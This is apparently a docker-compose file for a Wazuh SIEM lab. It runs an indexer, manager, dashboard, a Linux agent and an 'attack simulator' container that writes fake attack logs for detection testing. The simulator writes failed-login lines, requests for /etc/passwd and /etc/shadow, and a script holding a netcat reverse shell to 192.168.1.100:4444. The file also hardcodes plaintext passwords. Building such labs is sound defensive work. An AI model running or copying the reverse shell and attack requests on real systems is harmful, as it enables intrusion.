version: '3.8'

services:
  wazuh.indexer:
    image: wazuh/wazuh-indexer:4.7.2
    container_name: wazuh.indexer
    hostname: wazuh.indexer
    restart: always
    ports:
      - "0.0.0.0:9200:9200"
    environment:
      - "OPENSEARCH_JAVA_OPTS=-Xms1g -Xmx1g"
      - "bootstrap.memory_lock=true"
      - "discovery.type=single-node"
      - "network.host=0.0.0.0"
    ulimits:
      memlock:
        soft: -1
        hard: -1
      nofile:
        soft: 65536
        hard: 65536
    volumes:
      - wazuh-indexer-data:/var/lib/wazuh-indexer
      - ./config/wazuh_indexer_ssl_certs/root-ca.pem:/usr/share/wazuh-indexer/certs/root-ca.pem
      - ./config/wazuh_indexer_ssl_certs/wazuh.indexer-key.pem:/usr/share/wazuh-indexer/certs/wazuh.indexer-key.pem
      - ./config/wazuh_indexer_ssl_certs/wazuh.indexer.pem:/usr/share/wazuh-indexer/certs/wazuh.indexer.pem
      - ./config/wazuh_indexer_ssl_certs/admin.pem:/usr/share/wazuh-indexer/certs/admin.pem
      - ./config/wazuh_indexer_ssl_certs/admin-key.pem:/usr/share/wazuh-indexer/certs/admin-key.pem
      - ./config/wazuh_indexer/wazuh.indexer.yml:/usr/share/wazuh-indexer/opensearch.yml
      - ./config/wazuh_indexer/internal_users.yml:/usr/share/wazuh-indexer/opensearch-security/internal_users.yml
    networks:
      - single-node_default

  wazuh.manager:
    image: wazuh/wazuh-manager:4.7.2
    container_name: wazuh.manager
    hostname: wazuh.manager
    restart: always
    ports:
      - "0.0.0.0:1514:1514"
      - "0.0.0.0:1515:1515"
      - "0.0.0.0:514:514/udp"
      - "0.0.0.0:514:514/tcp"
      - "0.0.0.0:55000:55000"
    environment:
      - INDEXER_URL=https://wazuh.indexer:9200
      - INDEXER_USERNAME=admin
      - INDEXER_PASSWORD=SecretPassword
      - FILEBEAT_SSL_VERIFICATION_MODE=full
      - SSL_CERTIFICATE_AUTHORITIES=/etc/ssl/root-ca.pem
      - SSL_CERTIFICATE=/etc/ssl/filebeat.pem
      - SSL_KEY=/etc/ssl/filebeat.key
      - API_USERNAME=wazuh-wui
      - API_PASSWORD=MyS3cr37P450r.*-
    volumes:
      - wazuh_api_configuration:/var/ossec/api/configuration
      - wazuh_etc:/var/ossec/etc
      - wazuh_logs:/var/ossec/logs
      - wazuh_queue:/var/ossec/queue
      - wazuh_var_multigroups:/var/ossec/var/multigroups
      - wazuh_integrations:/var/ossec/integrations
      - wazuh_active_response:/var/ossec/active-response/bin
      - wazuh_agentless:/var/ossec/agentless
      - wazuh_wodles:/var/ossec/wodles
      - filebeat_etc:/etc/filebeat
      - filebeat_var:/var/lib/filebeat
      - ./config/wazuh_indexer_ssl_certs/root-ca-manager.pem:/etc/ssl/root-ca.pem
      - ./config/wazuh_indexer_ssl_certs/wazuh.manager.pem:/etc/ssl/filebeat.pem
      - ./config/wazuh_indexer_ssl_certs/wazuh.manager-key.pem:/etc/ssl/filebeat.key
      - ./config/wazuh_cluster/wazuh_manager.conf:/wazuh-config-mount/etc/ossec.conf
    depends_on:
      - wazuh.indexer
    networks:
      - single-node_default

  wazuh.dashboard:
    image: wazuh/wazuh-dashboard:4.7.2
    container_name: wazuh.dashboard
    hostname: wazuh.dashboard
    restart: always
    ports:
      - "0.0.0.0:443:5601"
    environment:
      - OPENSEARCH_HOSTS=https://wazuh.indexer:9200
      - WAZUH_API_URL=https://wazuh.manager
      - API_USERNAME=wazuh-wui
      - API_PASSWORD=MyS3cr37P450r.*-
    volumes:
      - ./config/wazuh_indexer_ssl_certs/wazuh.dashboard.pem:/usr/share/wazuh-dashboard/certs/wazuh-dashboard.pem
      - ./config/wazuh_indexer_ssl_certs/wazuh.dashboard-key.pem:/usr/share/wazuh-dashboard/certs/wazuh-dashboard-key.pem
      - ./config/wazuh_indexer_ssl_certs/root-ca.pem:/usr/share/wazuh-dashboard/certs/root-ca.pem
      - ./config/wazuh_dashboard/opensearch_dashboards.yml:/usr/share/wazuh-dashboard/config/opensearch_dashboards.yml
      - ./config/wazuh_dashboard/wazuh.yml:/usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml
      - wazuh-dashboard-config:/usr/share/wazuh-dashboard/data/wazuh/config
      - wazuh-dashboard-custom:/usr/share/wazuh-dashboard/plugins/wazuh/public/assets/custom
    depends_on:
      - wazuh.indexer
      - wazuh.manager
    networks:
      - single-node_default

  # NEW: Wazuh Agent Container
  wazuh.agent.linux:
    image: ubuntu:22.04
    container_name: wazuh.agent.linux
    hostname: systemA-linux
    restart: always
    command:
      - /bin/bash
      - -c
      - |
        sleep 30
        apt-get update -qq
        apt-get install -y -qq curl gnupg apt-transport-https lsb-release ca-certificates
        curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import
        chmod 644 /usr/share/keyrings/wazuh.gpg
        echo 'deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main' > /etc/apt/sources.list.d/wazuh.list
        apt-get update -qq
        WAZUH_MANAGER='wazuh.manager' WAZUH_AGENT_NAME='systemA-linux' apt-get install -y -qq wazuh-agent
        sed -i 's/MANAGER_IP/wazuh.manager/g' /var/ossec/etc/ossec.conf
        /var/ossec/bin/wazuh-control start
        sleep 5
        /var/ossec/bin/agent-auth -m wazuh.manager -A systemA-linux || true
        /var/ossec/bin/wazuh-control restart
        mkdir -p /var/log /tmp/monitored
        touch /var/log/auth.log /var/log/syslog
        while true; do
          echo "[$(date '+%b %d %H:%M:%S')] systemA-linux sshd[$$RANDOM]: Accepted password for ubuntu from 192.168.1.50 port 22 ssh2" >> /var/log/auth.log
          echo "[$(date '+%b %d %H:%M:%S')] systemA-linux systemd[1]: Started User Service" >> /var/log/syslog
          echo "Test data $(date)" > /tmp/monitored/test_file_$(date +%s).txt
          sleep 120
        done
    volumes:
      - agent_etc:/var/ossec/etc
      - agent_logs:/var/ossec/logs
      - agent_queue:/var/ossec/queue
    depends_on:
      - wazuh.manager
    networks:
      - single-node_default
    privileged: true

  # NEW: Attack Simulator Container
  attack.simulator:
    image: ubuntu:22.04
    container_name: attack.simulator
    hostname: attack-simulator
    restart: always
    command:
      - /bin/bash
      - -c
      - |
        mkdir -p /var/log/apache2 /var/log /tmp
        while true; do
          echo "[$(date '+%b %d %H:%M:%S')] attack-simulator sshd[$$RANDOM]: Failed password for root from 192.168.1.100 port $$RANDOM ssh2" >> /var/log/auth.log
          echo "[$(date '+%b %d %H:%M:%S')] attack-simulator sshd[$$RANDOM]: Failed password for admin from 192.168.1.100 port $$RANDOM ssh2" >> /var/log/auth.log
          echo "[$(date '+%d/%b/%Y:%H:%M:%S +0000')] 192.168.1.100 - - \"GET /admin.php?cmd=cat%20/etc/passwd HTTP/1.1\" 403 -" >> /var/log/apache2/access.log
          echo "[$(date '+%d/%b/%Y:%H:%M:%S +0000')] 192.168.1.100 - - \"GET /../../../etc/shadow HTTP/1.1\" 403 -" >> /var/log/apache2/access.log
          echo '#!/bin/bash' > /tmp/suspicious_script.sh
          echo 'nc -e /bin/bash 192.168.1.100 4444' >> /tmp/suspicious_script.sh
          chmod +x /tmp/suspicious_script.sh
          sleep 60
        done
    volumes:
      - attack-logs:/var/log
    networks:
      - single-node_default

volumes:
  wazuh-indexer-data:
  wazuh_api_configuration:
  wazuh_etc:
  wazuh_logs:
  wazuh_queue:
  wazuh_var_multigroups:
  wazuh_integrations:
  wazuh_active_response:
  wazuh_agentless:
  wazuh_wodles:
  filebeat_etc:
  filebeat_var:
  wazuh-dashboard-config:
  wazuh-dashboard-custom:
  agent_etc:
  agent_logs:
  agent_queue:
  attack-logs:

networks:
  single-node_default:
    driver: bridge
